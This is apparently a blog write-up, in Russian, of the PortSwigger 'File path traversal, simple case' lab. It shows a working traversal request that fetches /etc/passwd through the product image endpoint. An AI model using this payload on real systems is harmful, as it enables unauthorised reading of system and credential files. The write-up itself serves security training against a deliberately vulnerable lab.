---
title: "File path traversal, simple case"
date: 2025-07-03
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/file-path-traversal/lab-simple"
classes: wide
---

Эта лабораторная работа содержит уязвимость **Path Traversal** при отображении изображений продуктов.

## Solution

На странице представлены товары:

![IMG](/assets/images/PortSwigger/IMG_path_traversal/IMG_simple_case/1.png){: height="200" .align-center}

На странице информация о товаре выдается по его `id`:

```url
https://0a9b001d04fc186f81fd6bf600c3003a.web-security-academy.net/product?productId=1
```

Картинка каждого товара загружается с помощью запроса:

![IMG](/assets/images/PortSwigger/IMG_path_traversal/IMG_simple_case/2.png){: height="200" .align-center}

Такой запрос приводит к уязвимости **Path Traversal**. С помощью следующего запроса мы можем скачать файл с паролями:

```
https://0a9b001d04fc186f81fd6bf600c3003a.web-security-academy.net/image?filename=/../../../etc/passwd
```

![IMG](/assets/images/PortSwigger/IMG_path_traversal/IMG_simple_case/3.png){: height="200" .align-center}